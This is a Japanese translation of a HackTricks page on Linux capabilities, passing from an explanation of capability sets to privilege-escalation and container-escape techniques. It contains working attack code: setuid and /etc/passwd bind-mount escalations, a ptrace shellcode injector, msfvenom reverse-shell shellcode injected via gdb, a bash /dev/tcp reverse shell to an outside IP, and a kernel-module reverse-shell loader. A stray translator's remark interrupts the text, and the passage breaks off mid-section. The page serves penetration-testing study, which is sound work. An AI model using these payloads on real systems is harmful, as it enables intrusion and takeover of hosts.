# Linux Capabilities

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加する、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* **HackTricks**の[**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを共有する。

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/)は、**スペイン**で最も関連性の高いサイバーセキュリティイベントであり、**ヨーロッパ**で最も重要なイベントの一つです。技術知識の普及を使命として、この会議はあらゆる分野のテクノロジーとサイバーセキュリティの専門家のための活発な交流の場です。\\

{% embed url="https://www.rootedcon.com/" %}

## なぜcapabilitiesなのか？

Linux capabilitiesは、プロセスにroot権限の一部を提供します。これにより、root権限がより小さく独立した単位に分割されます。それぞれの単位は、独立してプロセスに付与することができます。これにより、権限のフルセットが削減され、悪用のリスクが減少します。

Linux capabilitiesの動作をよりよく理解するために、まず解決しようとしている問題を見てみましょう。

通常のユーザーとしてプロセスを実行しているとしましょう。これは、非特権的であることを意味します。私たちは、自分自身、自分のグループが所有するデータ、またはすべてのユーザーによるアクセスが許可されているデータにのみアクセスできます。ある時点で、プロセスはその義務を果たすためにもう少し権限が必要になります。例えば、ネットワークソケットを開くなどです。問題は、通常のユーザーはソケットを開くことができず、これにはroot権限が必要だということです。

## Capabilitiesセット

**継承されたcapabilities**

**CapEff**: _有効_なcapabilityセットは、プロセスが現在使用しているすべてのcapabilitiesを表します（これは、権限チェックにカーネルが使用する実際のcapabilityセットです）。ファイルcapabilitiesに関しては、有効セットは実際には、バイナリの実行時に許可セットのcapabilitiesが有効セットに移動するかどうかを示す単一のビットです。これにより、特別なシステムコールを発行せずにファイルcapabilitiesを使用できるようになります。

**CapPrm**: (_許可された_) これは、スレッドがスレッド許可セットまたはスレッド継承可能セットに追加できるcapabilitiesのスーパーセットです。スレッドはcapset()システムコールを使用してcapabilitiesを管理できます：任意のセットから任意のcapabilityを削除できますが、スレッド許可セットにあるcapabilitiesのみをスレッド有効セットおよび継承セットに追加できます。したがって、スレッド有効セットにcap\_setpcap capabilityがない限り、スレッド許可セットに新たなcapabilityを追加することはできません。

**CapInh**: _継承_セットを使用すると、親プロセスから継承されることが許可されているすべてのcapabilitiesを指定できます。これにより、プロセスが必要としないcapabilitiesを受け取ることが防止されます。このセットは`execve`を越えて保持され、通常はcapabilitiesを受け取るプロセスによって設定されます。

**CapBnd**: _バウンディング_セットを使用すると、プロセスが今後受け取ることができるcapabilitiesを制限できます。バウンディングセットに存在するcapabilitiesのみが、継承可能セットおよび許可セットで許可されます。

**CapAmb**: _アンビエント_ capabilityセットは、ファイルcapabilitiesを持たないすべての非SUIDバイナリに適用されます。`execve`を呼び出すときにcapabilitiesを保持します。ただし、アンビエントセット内のすべてのcapabilitiesが保持されるわけではありません。なぜなら、継承可能セットまたは許可セットに存在しない場合は削除されるからです。このセットは`execve`呼び出しを越えて保持されます。

スレッドとファイルのcapabilitiesの違い、およびスレッドにcapabilitiesがどのように渡されるかの詳細な説明については、以下のページを読んでください：

* [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
* [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

## プロセス & バイナリのCapabilities

### プロセスのCapabilities

特定のプロセスのcapabilitiesを確認するには、/procディレクトリ内の**status**ファイルを使用します。より詳細な情報を提供するため、Linux capabilitiesに関連する情報に限定しましょう。
すべての実行中のプロセスについては、capability情報がスレッドごとに保持され、ファイルシステム内のバイナリについては拡張属性に格納されています。

/usr/include/linux/capability.hで定義されているcapabilitiesを見つけることができます。

現在のプロセスのcapabilitiesは`cat /proc/self/status`で確認するか、`capsh --print`を実行することで、他のユーザーのものは`/proc/<pid>/status`で見つけることができます。
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
```markdown
このコマンドは、ほとんどのシステムで5行を返すはずです。

* CapInh = 継承された機能
* CapPrm = 許可された機能
* CapEff = 実効機能
* CapBnd = バウンディングセット
* CapAmb = アンビエント機能セット
```
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
これらの16進数は理解できません。capshユーティリティを使用して、それらを機能名にデコードできます。
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
次に、`ping`によって使用される**capabilities**を確認しましょう：
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
```
ただし、それも機能しますが、もっと簡単な方法があります。実行中のプロセスの機能を確認するには、単に **getpcaps** ツールにそのプロセスID（PID）を続けて使用します。プロセスIDのリストを提供することもできます。
```
```bash
getpcaps 1234
```
```markdown
ここで、ネットワークをスニッフィングするのに十分な権限（`cap_net_admin` と `cap_net_raw`）をバイナリに与えた後の `tcpdump` の機能を確認しましょう（_tcpdump はプロセス 9562 で実行されています_）：
```
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
### バイナリの機能

バイナリは実行中に使用できる機能を持つことがあります。例えば、`ping` バイナリが `cap_net_raw` 機能を持っていることは非常に一般的です：
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
**権限を持つバイナリを検索する**には、以下を使用します：
```bash
getcap -r / 2>/dev/null
```
### capshを使用した機能の削除

_ping_ の CAP\_NET\_RAW 機能を削除すると、ping ユーティリティはもはや機能しなくなるはずです。
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
_capsh_ の出力に加えて、_tcpdump_ コマンド自体もエラーを発生させるべきです。

> /bin/bash: /usr/sbin/tcpdump: 操作は許可されていません

このエラーは、ping コマンドが ICMP ソケットを開くことが許可されていないことを明確に示しています。これで期待通りに動作することが確かめられました。

### 権限を削除する

バイナリの権限を削除するには
```bash
setcap -r </path/to/binary>
```
## ユーザーキャパビリティ

**ユーザーにもキャパビリティを割り当てることが可能**であるようです。これは、ユーザーによって実行されるすべてのプロセスがユーザーのキャパビリティを使用できることを意味している可能性があります。\
[こちら](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7)、[こちら](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)、そして[こちら](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user)に基づくと、ユーザーに特定のキャパビリティを与えるためにいくつかのファイルを設定する必要がありますが、各ユーザーにキャパビリティを割り当てるファイルは`/etc/security/capability.conf`になります。\
ファイル例：
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## 環境機能

以下のプログラムをコンパイルすることで、**機能を提供する環境内でbashシェルを起動**することが可能です。

{% code title="ambient.c" %}
```c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```
Since the provided text appears to be a closing tag for a code block in markdown, there is no translatable content. Markdown syntax is universal and does not require translation. If you have any actual content that needs translation, please provide it, and I will translate it accordingly.
```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
**コンパイルされたambientバイナリによって実行されるbash内**では、**新しいcapabilities**（通常のユーザーは「current」セクションにいかなるcapabilityも持っていない）が観察できます。
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
{% hint style="danger" %}
設定されている権限の中で、**許可されている**セットと**継承可能**セットの両方に存在する機能のみを**追加することができます**。
{% endhint %}

### 機能認識/機能非認識バイナリ

**機能認識バイナリ**は環境から与えられた新しい機能を使用**しません**が、**機能非認識バイナリ**はそれらを拒否しないため使用**します**。これにより、バイナリに機能を付与する特別な環境内で機能非認識バイナリが脆弱になります。

## サービスの機能

デフォルトでは、**rootとして実行されるサービスにはすべての機能が割り当てられます**が、場合によってはこれが危険になることがあります。\
そのため、**サービス設定**ファイルでは、サービスに必要な**機能**を**指定**し、不要な権限でサービスを実行することを避けるためにそのサービスを実行すべき**ユーザー**を指定することができます：
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Dockerコンテナの機能

デフォルトでは、Dockerはコンテナにいくつかの機能を割り当てます。これらの機能が何であるかを確認するのは非常に簡単です。次のコマンドを実行します：
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/)は、**スペイン**で最も重要なサイバーセキュリティイベントであり、**ヨーロッパ**でも最も重要なイベントの一つです。**技術知識の普及を使命として**、この会議はあらゆる分野の技術およびサイバーセキュリティ専門家が集まる活発な交流の場です。

{% embed url="https://www.rootedcon.com/" %}

## Privesc/Container Escape

Capabilitiesは、**特権操作を実行した後に自分のプロセスを制限したい場合**（例えば、chrootの設定やソケットへのバインド後）に役立ちます。しかし、それらに悪意のあるコマンドや引数を渡すことで悪用され、rootとして実行される可能性があります。

プログラムにCapabilitiesを強制するには`setcap`を使用し、これらを照会するには`getcap`を使用します：
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
```
`+ep`は、効果的かつ許可された機能として追加していることを意味します（"-" はそれを削除するでしょう）。

システムまたはフォルダ内の機能を持つプログラムを特定するには：
```
```bash
getcap -r / 2>/dev/null
```
### 悪用例

次の例では、バイナリ `/usr/bin/python2.6` がprivescに対して脆弱であることが見つかりました：
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**パケットをスニッフィングするために任意のユーザーに必要な**Capabilities**:
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### "空"の権限の特別なケース

プログラムファイルに空の権限セットを割り当てることができることに注意してください。その結果、ユーザーID-rootプログラムを作成することができ、そのプログラムを実行するプロセスの実効および保存されたユーザーIDを0に変更しますが、そのプロセスに権限を付与しません。簡単に言うと、以下の条件を満たすバイナリがある場合：

1. rootによって所有されていない
2. `SUID`/`SGID`ビットが設定されていない
3. 空の権限セットを持っている（例：`getcap myelf`が`myelf =ep`を返す）

その場合、**そのバイナリはrootとして実行されます**。

## CAP\_SYS\_ADMIN

[**CAP\_SYS\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html)は、ほぼ万能の権限であり、追加の権限や完全なroot権限（通常はすべての権限へのアクセス）に簡単につながる可能性があります。`CAP_SYS_ADMIN`は、コンテナ内で特権操作が行われる場合、コンテナから削除するのが難しい範囲の**管理操作**を実行するために必要です。この権限を保持することは、個々のアプリケーションコンテナよりもシステム全体を模倣するコンテナにとってしばしば必要です。これにより、他のことの中でも**デバイスのマウント**や**release\_agent**の悪用によるコンテナからの脱出が可能になります。

**バイナリの例**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
```markdown
Pythonを使用して、変更された_passwd_ファイルを実際の_passwd_ファイルの上にマウントできます:
```
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
最後に、変更した`passwd`ファイルを`/etc/passwd`に**マウント**します：
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
And you will be able to **`su` as root** using password "password".

**環境を使った例 (Docker breakout)**

Dockerコンテナ内で有効になっているcapabilitiesを以下の方法で確認できます：
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
前の出力の中で、SYS\_ADMIN ケーパビリティが有効になっていることがわかります。

* **マウント**

これにより、docker コンテナは**ホストディスクをマウントして自由にアクセスする**ことができます：
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
* **フルアクセス**

前の方法では、dockerホストのディスクにアクセスすることに成功しました。\
もしホストで**ssh**サーバーが動作していることがわかった場合、dockerホストのディスク内に**ユーザーを作成し**、SSH経由でアクセスすることができます:
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP\_SYS\_PTRACE

**これは、ホスト内で実行されているプロセス内にシェルコードを注入してコンテナから脱出できることを意味します。** ホスト内で実行されているプロセスにアクセスするためには、コンテナは少なくとも **`--pid=host`** で実行する必要があります。

[**CAP\_SYS\_PTRACE**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は `ptrace(2)` や最近導入されたクロスメモリアタッチシステムコール、例えば `process_vm_readv(2)` と `process_vm_writev(2)` の使用を許可します。この機能が付与され、`ptrace(2)` システムコール自体が seccomp フィルターによってブロックされていない場合、攻撃者は他の seccomp 制限をバイパスすることができます。[ptrace が許可されている場合の seccomp バイパスの PoC](https://gist.github.com/thejh/8346f47e359adecd1d53) または **以下の PoC** を参照してください。

**バイナリ（python）を使用した例**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**バイナリを使用した例 (gdb)**

`ptrace` 機能を持つ `gdb`：
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
msfvenomを使用してgdb経由でメモリにインジェクトするシェルコードを作成する
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (8 - len(buf) % 8 ) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
ルートプロセスをgdbでデバッグし、以前生成されたgdbの行をコピー＆ペーストします：
```bash
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) set {long}($rip+0) = 0x296a909090909090
(gdb) set {long}($rip+8) = 0x5e016a5f026a9958
(gdb) set {long}($rip+16) = 0x0002b9489748050f
(gdb) set {long}($rip+24) = 0x48510b0e0a0a2923
(gdb) set {long}($rip+32) = 0x582a6a5a106ae689
(gdb) set {long}($rip+40) = 0xceff485e036a050f
(gdb) set {long}($rip+48) = 0x6af675050f58216a
(gdb) set {long}($rip+56) = 0x69622fbb4899583b
(gdb) set {long}($rip+64) = 0x8948530068732f6e
(gdb) set {long}($rip+72) = 0x050fe689485752e7
(gdb) c
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**環境を使った例 (Docker breakout) - 別の gdb の悪用**

もし **GDB** がインストールされている場合（または `apk add gdb` や `apt install gdb` でインストール可能な場合）、**ホストからプロセスをデバッグ**し、`system` 関数を呼び出すことができます。（この技術には `SYS_ADMIN` 権限も必要です）。**
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
コマンドの出力は見ることができませんが、そのプロセスによって実行されます（なので、リバースシェルを取得してください）。

{% hint style="warning" %}
エラー "No symbol "system" in current context." が出た場合は、gdbを介してプログラムにシェルコードをロードする前の例を確認してください。
{% endhint %}

**環境を使った例 (Docker 脱出) - シェルコード注入**

Dockerコンテナ内で有効になっている機能を以下のコマンドで確認できます：
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
ホストで実行中の**プロセス**をリストする `ps -eaf`

1. **アーキテクチャ**を取得する `uname -m`
2. アーキテクチャ用の**シェルコード**を見つける ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. プロセスのメモリに**シェルコード**を**注入**する**プログラム**を見つける ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. プログラム内の**シェルコード**を**変更**して**コンパイル**する `gcc inject.c -o inject`
5. 注入して**シェル**を取得する: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

[**CAP_SYS_MODULE**](https://man7.org/linux/man-pages/man7/capabilities.7.html) はプロセスが任意のカーネルモジュールをロードおよびアンロードすることを許可します（`init_module(2)`, `finit_module(2)`, `delete_module(2)` システムコール）。これにより、特権昇格とリング0の妥協が容易になります。カーネルは意のままに変更でき、システムのセキュリティ、Linuxセキュリティモジュール、コンテナシステムがすべて回避されます。\
**つまり、ホストマシンのカーネルにカーネルモジュールを** **挿入/削除できることを意味します。**

**バイナリの例**

以下の例では、バイナリ**`python`**がこの機能を持っています。
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
デフォルトでは、**`modprobe`** コマンドはディレクトリ **`/lib/modules/$(uname -r)`** で依存関係リストとマップファイルをチェックします。\
これを悪用するために、偽の **lib/modules** フォルダを作成しましょう：
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
次に、以下の2つの例にある**カーネルモジュールをコンパイルして、**このフォルダにコピーします：
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
最後に、このカーネルモジュールをロードするために必要なPythonコードを実行します：
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**例2 バイナリを使用した場合**

次の例では、バイナリ **`kmod`** がこの機能を持っています。
```bash
getcap -r / 2>/dev/null
